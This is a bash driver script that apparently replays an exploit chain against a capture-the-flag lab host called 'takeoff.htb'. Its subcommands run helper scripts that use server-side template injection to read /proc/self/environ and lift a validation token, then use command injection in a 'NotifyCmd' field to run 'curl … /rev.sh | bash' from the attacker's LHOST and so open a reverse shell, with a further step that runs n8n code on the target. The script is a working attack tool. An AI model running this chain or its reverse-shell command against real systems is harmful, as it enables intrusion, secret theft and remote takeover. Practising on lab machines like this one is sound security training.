#!/usr/bin/env bash
# Takeoff replay. No secrets in this file.
#   export TARGET=10.129.x.x LHOST=10.10.x.x
#   ./replay.sh hosts
#   ./replay.sh book
#   ./replay.sh ssti /proc/self/environ
#   ./replay.sh rce            # needs TICKET_VALIDATION_TOKEN + nc :4444
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

die() { echo "[-] $*" >&2; exit 1; }
need_target() { [[ -n "${TARGET:-}" ]] || die "export TARGET=<ip>"; }
need_lhost() { [[ -n "${LHOST:-}" ]] || die "export LHOST=<tun0>"; }

if [[ -f "$SCRIPT_DIR/../secrets.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$SCRIPT_DIR/../secrets.env"
  set +a
fi

cmd="${1:-help}"
shift || true

case "$cmd" in
  hosts)
    need_target
    echo "${TARGET} takeoff.htb" | sudo tee -a /etc/hosts
    ;;
  book)
    need_target
    python3 ./01-book.py
    ;;
  ssti)
    need_target
    python3 ./02-ssti-read.py --printf "${1:-/proc/self/environ}"
    ;;
  rce)
    need_target
    need_lhost
    [[ -n "${TICKET_VALIDATION_TOKEN:-}" ]] || die "export TICKET_VALIDATION_TOKEN (from ssti environ)"
    python3 ./03-checkin-rce.py --cmd "curl -s http://${LHOST}:${HTTP_PORT:-8888}/rev.sh | bash"
    ;;
  cmd)
    need_target
    [[ -n "${TICKET_VALIDATION_TOKEN:-}" ]] || die "export TICKET_VALIDATION_TOKEN"
    [[ -n "${1:-}" ]] || die "./replay.sh cmd 'id'"
    python3 ./03-checkin-rce.py --cmd "$1"
    ;;
  n8n)
    die "copy 04-n8n-exec.py + wf-flex.json onto the box (www-data) and run against 127.0.0.1:5678"
    ;;
  help|*)
    cat <<EOF
usage: export TARGET LHOST; ./replay.sh <cmd>

  hosts     append takeoff.htb to /etc/hosts (sudo)
  book      register + test card + Coach booking
  ssti [path]   File-read via notes PDF (default /proc/self/environ)
  rce       NotifyCmd reverse via http://LHOST:8888/rev.sh
  cmd <sh>  NotifyCmd one-shot
  n8n       reminder: run 04-n8n-exec.py on the target

Needs: python3, pdftotext, go. Source ../secrets.env if present.
EOF
    ;;
esac
